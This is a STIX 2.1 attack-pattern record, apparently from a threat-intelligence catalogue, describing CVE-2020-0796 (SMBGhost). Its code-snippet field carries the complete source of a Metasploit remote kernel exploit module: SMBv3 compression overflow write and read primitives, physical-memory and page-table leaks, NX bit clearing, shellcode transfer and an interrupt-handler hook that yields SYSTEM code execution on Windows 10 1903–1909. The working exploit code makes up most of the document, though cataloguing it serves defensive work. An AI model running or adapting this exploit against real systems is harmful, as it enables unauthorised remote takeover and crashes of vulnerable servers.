{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--af2f3a37-39f3-47d3-8a5f-2c9a9ebc8db7",
    "created": "2024-08-14T16:56:20.345213Z",
    "modified": "2024-08-14T16:56:20.345217Z",
    "name": "SMBv3 Compression Buffer Overflow",
    "description": " A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to execute code on a vulnerable server. This remove exploit implementation leverages this flaw to execute code in the context of the kernel, finally yielding a session as NT AUTHORITY\\SYSTEM in spoolsv.exe. Exploitation can take a few minutes as the necessary data is gathered. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/cve_2020_0796_smbghost.rb",
            "external_id": "cve_2020_0796_smbghost.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0796"
        },
        {
            "source_name": "reference",
            "url": "https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/chompie1337/SMBGhost_RCE_PoC"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=RSV3f6aEJFY&t=1865s"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows"
        },
        {
            "source_name": "reference",
            "url": "https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  LZNT1 = RubySMB::Compression::LZNT1\n\n  # KUSER_SHARED_DATA offsets, these are defined by the module and are therefore target independent\n  KSD_VA_MAP = 0x800\n  KSD_VA_PMDL = 0x900\n  KSD_VA_SHELLCODE = 0x950 # needs to be the highest offset for #cleanup\n\n  MAX_READ_RETRIES = 5\n  WRITE_UNIT = 0xd0\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SMBv3 Compression Buffer Overflow',\n        'Description' => %q{\n          A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to\n          execute code on a vulnerable server. This remove exploit implementation leverages this flaw to execute code\n          in the context of the kernel, finally yielding a session as NT AUTHORITY\\SYSTEM in spoolsv.exe. Exploitation\n          can take a few minutes as the necessary data is gathered.\n        },\n        'Author' => [\n          'hugeh0ge', # Ricerca Security research, detailed technique description\n          'chompie1337', # PoC on which this module is based\n          'Spencer McIntyre', # msf module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2020-0796' ],\n          [ 'URL', 'https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html' ],\n          [ 'URL', 'https://github.com/chompie1337/SMBGhost_RCE_PoC' ],\n          # the rest are not cve-2020-0796 specific but are on topic regarding the techniques used within the exploit\n          [ 'URL', 'https://www.youtube.com/watch?v=RSV3f6aEJFY&t=1865s' ],\n          [ 'URL', 'https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems' ],\n          [ 'URL', 'https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows' ],\n          [ 'URL', 'https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/' ]\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'WfsDelay' => 10\n        },\n        'Privileged' => true,\n        'Payload' => {\n          'Space' => 600,\n          'DisableNops' => true\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows 10 v1903-1909 x64',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'OverflowSize' => 0x1100,\n              'LowStubFingerprint' => 0x1000600e9,\n              'KuserSharedData' => 0xfffff78000000000,\n              # Offset(From,To) => Bytes\n              'Offset(HalpInterruptController,HalpApicRequestInterrupt)' => 0x78,\n              'Offset(LowStub,SelfVA)' => 0x78,\n              'Offset(LowStub,PML4)' => 0xa0,\n              'Offset(SrvnetBufferHdr,pMDL1)' => 0x38,\n              'Offset(SrvnetBufferHdr,pNetRawBuffer)' => 0x18\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-03-13',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'AKA' => [ 'SMBGhost', 'CoronaBlue' ],\n          'Stability' => [ CRASH_OS_RESTARTS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n          'RelatedModules' => [ 'exploit/windows/local/cve_2020_0796_smbghost' ],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options([Opt::RPORT(445),])\n    register_advanced_options([\n      OptBool.new('DefangedMode', [true, 'Run in defanged mode', true])\n    ])\n  end\n\n  def check\n    begin\n      client = RubySMB::Client.new(\n        RubySMB::Dispatcher::Socket.new(connect(false)),\n        username: '',\n        password: '',\n        smb1: false,\n        smb2: false,\n        smb3: true\n      )\n      protocol = client.negotiate\n      client.disconnect!\n    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError\n      return CheckCode::Unknown\n    rescue Errno::ECONNRESET\n      return CheckCode::Unknown\n    rescue ::Exception => e # rubocop:disable Lint/RescueException\n      vprint_error(\"#{rhost}: #{e.class} #{e}\")\n      return CheckCode::Unknown\n    end\n\n    return CheckCode::Safe unless protocol == 'SMB3'\n    return CheckCode::Safe unless client.dialect == '0x0311'\n\n    lznt1_algorithm = RubySMB::SMB2::CompressionCapabilities::COMPRESSION_ALGORITHM_MAP.key('LZNT1')\n    return CheckCode::Safe unless client.server_compression_algorithms.include?(lznt1_algorithm)\n\n    CheckCode::Detected\n  end\n\n  def smb_negotiate\n    # need a custom negotiate function because the responses will be corrupt while reading memory\n    sock = connect(false)\n    dispatcher = RubySMB::Dispatcher::Socket.new(sock)\n\n    packet = RubySMB::SMB2::Packet::NegotiateRequest.new\n    packet.client_guid = SecureRandom.random_bytes(16)\n    packet.set_dialects((RubySMB::Client::SMB2_DIALECT_DEFAULT + RubySMB::Client::SMB3_DIALECT_DEFAULT).map { |d| d.to_i(16) })\n\n    packet.capabilities.large_mtu = 1\n    packet.capabilities.encryption = 1\n\n    nc = RubySMB::SMB2::NegotiateContext.new(\n      context_type: RubySMB::SMB2::NegotiateContext::SMB2_PREAUTH_INTEGRITY_CAPABILITIES\n    )\n    nc.data.hash_algorithms << RubySMB::SMB2::PreauthIntegrityCapabilities::SHA_512\n    nc.data.salt = \"\\x00\" * 32\n    packet.add_negotiate_context(nc)\n\n    nc = RubySMB::SMB2::NegotiateContext.new(\n      context_type: RubySMB::SMB2::NegotiateContext::SMB2_COMPRESSION_CAPABILITIES\n    )\n    nc.data.flags = 1\n    nc.data.compression_algorithms << RubySMB::SMB2::CompressionCapabilities::LZNT1\n    packet.add_negotiate_context(nc)\n\n    dispatcher.send_packet(packet)\n    dispatcher\n  end\n\n  def write_primitive(data, addr)\n    dispatcher = smb_negotiate\n    dispatcher.tcp_socket.get_once  # disregard the response\n\n    uncompressed_data = rand(0x41..0x5a).chr * (target['OverflowSize'] - data.length)\n    uncompressed_data << \"\\x00\" * target['Offset(SrvnetBufferHdr,pNetRawBuffer)']\n    uncompressed_data << [ addr ].pack('Q<')\n\n    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(\n      original_compressed_segment_size: 0xffffffff,\n      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,\n      offset: data.length,\n      compressed_data: (data + LZNT1.compress(uncompressed_data)).bytes\n    )\n    dispatcher.send_packet(pkt)\n    dispatcher.tcp_socket.close\n  end\n\n  def write_srvnet_buffer_hdr(data, offset)\n    dispatcher = smb_negotiate\n    dispatcher.tcp_socket.get_once  # disregard the response\n\n    dummy_data = rand(0x41..0x5a).chr * (target['OverflowSize'] + offset)\n    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(\n      original_compressed_segment_size: 0xffffefff,\n      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,\n      offset: dummy_data.length,\n      compressed_data: (dummy_data + CorruptLZNT1.compress(data)).bytes\n    )\n    dispatcher.send_packet(pkt)\n    dispatcher.tcp_socket.close\n  end\n\n  def read_primitive(phys_addr)\n    value = @memory_cache[phys_addr]\n    return value unless value.nil?\n\n    vprint_status(\"Reading from physical memory at index: 0x#{phys_addr.to_s(16).rjust(16, '0')}\")\n    fake_mdl = MDL.new(\n      mdl_size: 0x48,\n      mdl_flags: 0x5018,\n      mapped_system_va: (target['KuserSharedData'] + KSD_VA_MAP),\n      start_va: ((target['KuserSharedData'] + KSD_VA_MAP) & ~0xfff),\n      byte_count: 600,\n      byte_offset: ((phys_addr & 0xfff) + 0x4)\n    )\n    phys_addr_enc = (phys_addr & 0xfffffffffffff000) >> 12\n\n    (MAX_READ_RETRIES * 2).times do |try|\n      write_primitive(fake_mdl.to_binary_s + ([ phys_addr_enc ] * 3).pack('Q<*'), (target['KuserSharedData'] + KSD_VA_PMDL))\n      write_srvnet_buffer_hdr([(target['KuserSharedData'] + KSD_VA_PMDL)].pack('Q<'), target['Offset(SrvnetBufferHdr,pMDL1)'])\n\n      MAX_READ_RETRIES.times do |_|\n        dispatcher = smb_negotiate\n        blob = dispatcher.tcp_socket.get_once\n        dispatcher.tcp_socket.close\n        next '' if blob.nil?\n        next if blob[4..7] == \"\\xfeSMB\".b\n\n        @memory_cache[phys_addr] = blob\n        return blob\n      end\n      sleep try**2\n    end\n\n    fail_with(Failure::Unknown, 'Failed to read physical memory')\n  end\n\n  def find_low_stub\n    common = [0x13000].to_enum # try the most common value first\n    all = (0x1000..0x100000).step(0x1000)\n    (common + all).each do |index|\n      buff = read_primitive(index)\n      entry = buff.unpack('Q<').first\n      next unless (entry & 0xffffffffffff00ff) == (target['LowStubFingerprint'] & 0xffffffffffff00ff)\n\n      lowstub_va = buff[target['Offset(LowStub,SelfVA)']...(target['Offset(LowStub,SelfVA)'] + 8)].unpack('Q<').first\n      print_status(\"Found low stub at physical address 0x#{index.to_s(16).rjust(16, '0')}, virtual address 0x#{lowstub_va.to_s(16).rjust(16, '0')}\")\n      pml4 = buff[target['Offset(LowStub,PML4)']...(target['Offset(LowStub,PML4)'] + 8)].unpack('Q<').first\n      print_status(\"Found PML4 at 0x#{pml4.to_s(16).rjust(16, '0')} \" + { 0x1aa000 => '(BIOS)', 0x1ad000 => '(UEFI)' }.fetch(pml4, ''))\n\n      phal_heap = lowstub_va & 0xffffffffffff0000\n      print_status(\"Found HAL heap at 0x#{phal_heap.to_s(16).rjust(16, '0')}\")\n\n      return { pml4: pml4, phal_heap: phal_heap }\n    end\n\n    fail_with(Failure::Unknown, 'Failed to find the low stub')\n  end\n\n  def find_pml4_selfref(pointers)\n    search_len = 0x1000\n    index = pointers[:pml4]\n\n    while search_len > 0\n      buff = read_primitive(index)\n      buff = buff[0...-(buff.length % 8)]\n      buff.unpack('Q<*').each_with_index do |entry, i|\n        entry &= 0xfffff000\n        next unless entry == pointers[:pml4]\n\n        selfref = ((index + (i * 8)) & 0xfff) >> 3\n        pointers[:pml4_selfref] = selfref\n        print_status(\"Found PML4 self-reference entry at 0x#{selfref.to_s(16).rjust(4, '0')}\")\n        return pointers\n      end\n      search_len -= [buff.length, 8].max\n      index += [buff.length, 8].max\n    end\n\n    fail_with(Failure::Unknown, 'Failed to leak the PML4 self reference')\n  end\n\n  def get_phys_addr(pointers, va_addr)\n    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))\n    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))\n    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))\n    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))\n\n    pml4e = pointers[:pml4] + pml4_index * 8\n    pdpt_buff = read_primitive(pml4e)\n\n    pdpt = pdpt_buff.unpack('Q<').first & 0xfffff000\n    pdpte = pdpt + pdpt_index * 8\n    pdt_buff = read_primitive(pdpte)\n\n    pdt = pdt_buff.unpack('Q<').first & 0xfffff000\n    pdte = pdt + pdt_index * 8\n    pt_buff = read_primitive(pdte)\n\n    pt = pt_buff.unpack('Q<').first\n    unless pt & (1 << 7) == 0\n      return (pt & 0xfffff000) + (pt_index & 0xfff) * 0x1000 + (va_addr & 0xfff)\n    end\n\n    pt &= 0xfffff000\n    pte = pt + pt_index * 8\n    pte_buff = read_primitive(pte)\n    (pte_buff.unpack('Q<').first & 0xfffff000) + (va_addr & 0xfff)\n  end\n\n  def disable_nx(pointers, addr)\n    lb = (0xffff << 48) | (pointers[:pml4_selfref] << 39)\n    ub = ((0xffff << 48) | (pointers[:pml4_selfref] << 39) + 0x8000000000 - 1) & 0xfffffffffffffff8\n    pte_va = ((addr >> 9) | lb) & ub\n\n    phys_addr = get_phys_addr(pointers, pte_va)\n    orig_val = read_primitive(phys_addr).unpack1('Q<')\n    overwrite_val = orig_val & ((1 << 63) - 1)\n    write_primitive([ overwrite_val ].pack('Q<'), pte_va)\n    { pte_va: pte_va, original: orig_val }\n  end\n\n  def search_hal_heap(pointers)\n    va_cursor = pointers[:phal_heap]\n    end_va = va_cursor + 0x20000\n\n    while va_cursor < end_va\n      phys_addr = get_phys_addr(pointers, va_cursor)\n      buff = read_primitive(phys_addr)\n      buff = buff[0...-(buff.length % 8)]\n      values = buff.unpack('Q<*')\n      window_size = 8 # using a sliding window to fingerprint the memory\n      0.upto(values.length - window_size) do |i| # TODO: if the heap structure exists over two pages, this will break\n        va = va_cursor + (i * 8)\n        window = values[i...(i + window_size)]\n        next unless window[0...3].all? { |value| value & 0xfffff00000000000 == 0xfffff00000000000 }\n        next unless window[4...8].all? { |value| value & 0xffffff0000000000 == 0xfffff80000000000 }\n        next unless window[3].between?(0x20, 0x40)\n        next unless (window[0] - window[2]).between?(0x80, 0x180)\n\n        phalp_ari = read_primitive(get_phys_addr(pointers, va) + target['Offset(HalpInterruptController,HalpApicRequestInterrupt)']).unpack('Q<').first\n        next if read_primitive(get_phys_addr(pointers, phalp_ari))[0...8] != \"\\x48\\x89\\x6c\\x24\\x20\\x56\\x41\\x54\" # mov qword ptr [rsp+20h], rbp; push rsi; push r12\n\n        # looks legit (TM), lets hope for the best\n        # use WinDBG to validate the hal!HalpInterruptController value manually\n        # 0: kd> dq poi(hal!HalpInterruptController) L1\n        pointers[:pHalpInterruptController] = va\n        print_status(\"Found hal!HalpInterruptController at 0x#{va.to_s(16).rjust(16, '0')}\")\n\n        # use WinDBG to validate the hal!HalpApicRequestInterrupt value manually\n        # 0: kd> dq u poi(poi(hal!HalpInterruptController)+78) L1\n        pointers[:pHalpApicRequestInterrupt] = phalp_ari\n        print_status(\"Found hal!HalpApicRequestInterrupt at 0x#{phalp_ari.to_s(16).rjust(16, '0')}\")\n        return pointers\n      end\n\n      va_cursor += buff.length\n    end\n    fail_with(Failure::Unknown, 'Failed to leak the address of hal!HalpInterruptController')\n  end\n\n  def build_shellcode(pointers)\n    source = File.read(File.join(Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2020-0796', 'RCE', 'kernel_shellcode.asm'), mode: 'rb')\n    edata = Metasm::Shellcode.assemble(Metasm::X64.new, source).encoded\n    user_shellcode = payload.encoded\n    edata.fixup 'PHALP_APIC_REQUEST_INTERRUPT' => pointers[:pHalpApicRequestInterrupt]\n    edata.fixup 'PPHALP_APIC_REQUEST_INTERRUPT' => pointers[:pHalpInterruptController] + target['Offset(HalpInterruptController,HalpApicRequestInterrupt)']\n    edata.fixup 'USER_SHELLCODE_SIZE' => user_shellcode.length\n    edata.data + user_shellcode\n  end\n\n  def exploit\n    if datastore['DefangedMode']\n      warning = <<~EOF\n\n\n        Are you SURE you want to execute this module? There is a high probability that even when the exploit is\n        successful the remote target will crash within about 90 minutes.\n\n        Disable the DefangedMode option to proceed.\n      EOF\n\n      fail_with(Failure::BadConfig, warning)\n    end\n\n    fail_with(Failure::BadConfig, \"Incompatible payload: #{datastore['PAYLOAD']} (must be x64)\") unless payload.arch.include? ARCH_X64\n    @memory_cache = {}\n    @shellcode_length = 0\n    pointers = find_low_stub\n    pointers = find_pml4_selfref(pointers)\n    pointers = search_hal_heap(pointers)\n\n    @nx_info = disable_nx(pointers, target['KuserSharedData'])\n    print_status('KUSER_SHARED_DATA PTE NX bit cleared!')\n\n    shellcode = build_shellcode(pointers)\n    vprint_status(\"Transferring #{shellcode.length} bytes of shellcode...\")\n    @shellcode_length = shellcode.length\n    write_bytes = 0\n    while write_bytes < @shellcode_length\n      write_sz = [WRITE_UNIT, @shellcode_length - write_bytes].min\n      write_primitive(shellcode[write_bytes...(write_bytes + write_sz)], (target['KuserSharedData'] + KSD_VA_SHELLCODE) + write_bytes)\n      write_bytes += write_sz\n    end\n    vprint_status('Transfer complete, hooking hal!HalpApicRequestInterrupt to trigger execution...')\n    write_primitive([(target['KuserSharedData'] + KSD_VA_SHELLCODE)].pack('Q<'), pointers[:pHalpInterruptController] + target['Offset(HalpInterruptController,HalpApicRequestInterrupt)'])\n  end\n\n  def cleanup\n    return unless @memory_cache&.present?\n\n    if @nx_info&.present?\n      print_status('Restoring the KUSER_SHARED_DATA PTE NX bit...')\n      write_primitive([ @nx_info[:original] ].pack('Q<'), @nx_info[:pte_va])\n    end\n\n    # need to restore the contents of KUSER_SHARED_DATA to zero to avoid a bugcheck\n    vprint_status('Cleaning up the contents of KUSER_SHARED_DATA...')\n    start_va = target['KuserSharedData'] + KSD_VA_MAP - WRITE_UNIT\n    end_va = target['KuserSharedData'] + KSD_VA_SHELLCODE + @shellcode_length\n    (start_va..end_va).step(WRITE_UNIT).each do |cursor|\n      write_primitive(\"\\x00\".b * [WRITE_UNIT, end_va - cursor].min, cursor)\n    end\n  end\n\n  module CorruptLZNT1\n    def self.compress(buf, chunk_size: 0x1000)\n      out = ''\n      until buf.empty?\n        chunk = buf[0...chunk_size]\n        compressed = LZNT1.compress_chunk(chunk)\n\n        # always use the compressed chunk, even if it's larger\n        out << [ 0xb000 | (compressed.length - 1) ].pack('v')\n        out << compressed\n\n        buf = buf[chunk_size..]\n        break if buf.nil?\n      end\n\n      out << [ 0x1337 ].pack('v')\n      out\n    end\n  end\n\n  class MDL < BinData::Record\n    # https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_MDL\n    endian :little\n    uint64 :next_mdl\n    uint16 :mdl_size\n    uint16 :mdl_flags\n    uint16 :allocation_processor_number\n    uint16 :reserved\n    uint64 :process\n    uint64 :mapped_system_va\n    uint64 :start_va\n    uint32 :byte_count\n    uint32 :byte_offset\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-13",
    "x_mitre_platforms": [
        "win'"
    ]
}